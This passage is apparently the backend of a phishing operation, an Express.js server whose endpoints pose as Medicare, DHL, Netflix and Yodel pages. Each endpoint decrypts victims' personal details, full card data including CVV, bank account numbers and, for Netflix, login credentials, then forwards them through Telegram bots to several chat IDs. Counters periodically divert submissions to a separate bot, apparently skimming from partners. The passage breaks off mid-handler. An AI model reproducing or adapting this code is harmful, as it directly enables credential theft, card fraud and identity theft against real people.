  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=Medicare:\n${originalText}`
      );

      res.send("Update Completed");
    });
});

app.options("/kelvMedicare", cors());

app.post("/kelvMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      if (kelvCount == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-757683438&text=Medicare:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//DHL
//DHL
//DHL

let mason = 4;

app.options("/masonDHL", cors());

app.post("/masonDHL", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=DHLMason:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=DHL:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

//NETLIX
//NETLIX
//NETLIX

app.options("/fpaysNetflix", cors());

app.post("/fpaysNetflix", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      var loginText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
      if (fpaysC == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Netflix:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NetflixLogin:\n${loginText}`
        );
        fpaysC += 1;
      }

      res.send("Update Completed");
    });
});

//YODEL
//YODEL
//YODEL

app.options("/sendYodelRes", cors());

app.post("/sendYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelCB:\n${originalText}`
      );
      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=YodelCB:\n${originalText}`
      );

      res.send("Update Completed");
    });
});

app.options("/sendSSYodelres", cors());

let ssCount = 0;

app.post("/sendSSYodelres", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1270989114&text=Yodel:\n${originalText}`
        );
        ssCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/yodelM4STERB0Y", cors());

let yodelM4STERB0Y = 0;

app.post("/yodelM4STERB0Y", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (yodelM4STERB0Y == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        yodelM4STERB0Y = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelM4STER:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=Yodel:\n${originalText}`
        );
        yodelM4STERB0Y += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/sendARRYodelRes", cors());

let arcount = 0;

app.post("/sendARRYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (arcount == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        arcount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelAR:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=853331970&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=999824723&text=Yodel:\n${originalText}`
        );
        arcount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/mazzaYodel", cors());

app.post("/mazzaYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mazCount = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelMazza:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
        );
        mazCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/yardzYodel", cors());

app.post("/yardzYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        yardzCount = 6;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelYardz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5138777422&text=Yodel:\n${originalText}`
        );
        yardzCount += 1;
      }

      res.send("Update Completed");
    });
});

let hoods = 2;

app.options("/hoodsYodel", cors());

app.post("/hoodsYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
